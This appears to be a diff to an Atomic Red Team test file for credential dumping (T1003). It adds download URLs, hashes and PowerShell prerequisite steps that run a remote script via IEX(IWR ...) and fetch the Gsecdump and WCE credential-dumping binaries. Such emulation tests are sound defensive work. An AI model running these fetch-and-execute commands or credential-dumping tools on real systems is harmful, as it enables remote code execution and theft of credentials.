@@ -30,15 +30,27 @@ atomic_tests:
       description: Path to the Gsecdump executable
       type: Path
       default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
+    gsecdump_url:
+      description: Path to download Gsecdump binary file
+      type: url
+      default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
+    gsecdump_bin_hash:
+      description: File hash of the Gsecdump binary file
+      type: String
+      default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
 
   dependency_executor_name: powershell
   dependencies:
     - description: |
-        Windows Credential Editor must exist on disk at specified location (#{gsecdump_exe})
+        Gsecdump must exist on disk at specified location (#{gsecdump_exe})
       prereq_command: |
         if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}
       get_prereq_command: |
-        Write-Host Automated installer not implemented yet
+        $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+        if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
+          Move-Item $binpath "#{gsecdump_exe}"
+        }
 
   executor:
     name: command_prompt
@@ -78,6 +90,7 @@ atomic_tests:
         if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
       get_prereq_command: |
         $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
         if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
           Expand-Archive $zippath $parentpath\wce -Force
           Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
